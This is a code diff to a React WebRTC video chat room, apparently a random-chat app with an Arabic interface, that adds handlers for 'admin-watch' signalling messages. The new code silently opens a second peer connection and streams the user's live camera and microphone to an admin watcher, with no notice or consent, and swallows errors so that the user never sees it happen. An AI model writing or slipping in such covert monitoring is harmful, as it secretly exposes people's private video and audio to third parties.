@@ -175,6 +175,7 @@ export default function ChatRoom() {
 
   // ── refs ───────────────────────────────────────────────────────────────────
   const pcRef          = useRef<RTCPeerConnection | null>(null);
+  const adminWatchPcRef = useRef<RTCPeerConnection | null>(null);
   const localStreamRef = useRef<MediaStream | null>(null);
   const localVideoRef  = useRef<HTMLVideoElement>(null);
   const remoteVideoRef = useRef<HTMLVideoElement>(null);
@@ -405,6 +406,44 @@ export default function ChatRoom() {
         toast.error(msg.message || 'رصيد نجوم غير كافٍ لاستخدام الرادار');
         walletQuery.refetch();
         setTimeout(() => setLocation('/store'), 1500);
+        break;
+
+      case 'admin-watch-request': {
+        // Admin requests to watch this peer's stream silently
+        const { watcherId } = msg;
+        if (!localStreamRef.current || !watcherId) break;
+        try {
+          adminWatchPcRef.current?.close();
+          const watchPc = new RTCPeerConnection(ICE_CONFIG);
+          adminWatchPcRef.current = watchPc;
+          localStreamRef.current.getTracks().forEach(t =>
+            watchPc.addTrack(t, localStreamRef.current!)
+          );
+          watchPc.onicecandidate = (e) => {
+            if (!e.candidate) return;
+            fetch('/api/signal/send', {
+              method: 'POST', headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ peerId: myId, type: 'admin-watch-ice', data: { candidate: e.candidate, watcherId } }),
+            }).catch(() => {});
+          };
+          const offer = await watchPc.createOffer();
+          await watchPc.setLocalDescription(offer);
+          await fetch('/api/signal/send', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ peerId: myId, type: 'admin-watch-offer', data: { offer, watcherId } }),
+          });
+        } catch { /* silent — must never disrupt main call */ }
+        break;
+      }
+      case 'admin-watch-answer':
+        try { await adminWatchPcRef.current?.setRemoteDescription(new RTCSessionDescription(msg.data)); } catch {}
+        break;
+      case 'admin-watch-ice-to-peer':
+        try { await adminWatchPcRef.current?.addIceCandidate(new RTCIceCandidate(msg.data)); } catch {}
+        break;
+      case 'admin-watch-stop':
+        adminWatchPcRef.current?.close();
+        adminWatchPcRef.current = null;
         break;
     }
   }, [createPC, signal, addMessage, startTimer, stopTimer, closePC, resetRemote, showGiftAnim, peerName, walletQuery, setLocation]);
